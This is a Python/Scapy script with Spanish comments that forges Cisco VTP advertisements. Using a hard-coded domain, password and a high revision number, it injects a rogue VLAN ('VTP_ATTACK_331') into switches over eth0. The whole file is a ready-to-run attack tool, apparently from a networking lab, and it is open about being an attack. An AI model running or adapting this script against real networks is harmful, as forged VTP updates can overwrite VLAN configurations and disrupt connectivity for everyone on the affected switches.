from scapy.all import *
import hashlib

# --- CONFIGURACIÓN DE PARÁMETROS ---
iface = "eth0"                # Interfaz conectada al switch
domain = b"ITLA"              # Dominio VTP detectado
password = b"itla"            # Contraseña VTP (si aplica)
revision = 65000              # Número de revisión superior al actual
v_id = 331                    # ID de la VLAN a inyectar
v_name = b"VTP_ATTACK_331"    # Nombre de la VLAN

def vtp_attack():
    # Capas de Enlace y SNAP (Cisco)
    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(iface))
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
    v_snap = SNAP(OUI=0x00000c, code=0x2003)
    
    # Estructura de información de la VLAN (VLAN Info Field)
    v_info = b"\x0c\x00" + len(v_name).to_bytes(1, 'big') + v_id.to_bytes(2, 'big')
    v_info += b"\x05\xdc\x00\x00\x00\x01" # MTU (1500) e Index
    v_info += v_name.ljust((len(v_name) + 3) // 4 * 4, b"\x00") # Alineación a 4 bytes
    
    # Cálculo del MD5 Digest de VTP
    m = hashlib.md5()
    m.update(b"\x01" + password + domain.ljust(32, b"\x00") + revision.to_bytes(4, 'big'))
    m.update(v_info)
    digest = m.digest()

    # Construcción de Mensajes VTP
    summary = b"\x01\x01\x01" + len(domain).to_bytes(1, 'big') + domain.ljust(32, b"\x00")
    summary += revision.to_bytes(4, 'big') + digest
    
    subset = b"\x02\x01" + len(domain).to_bytes(1, 'big') + domain.ljust(32, b"\x00")
    subset += revision.to_bytes(4, 'big')
    
    # Empaquetado y envío
    p1 = dot3/llc/v_snap/summary
    p2 = dot3/llc/v_snap/(subset + v_info)
    
    print(f"[*] Enviando ataque VTP (Revision: {revision})...")
    sendp([p1, p2], iface=iface, count=50, inter=0.001, verbose=False)

if __name__ == "__main__":
    vtp_attack()
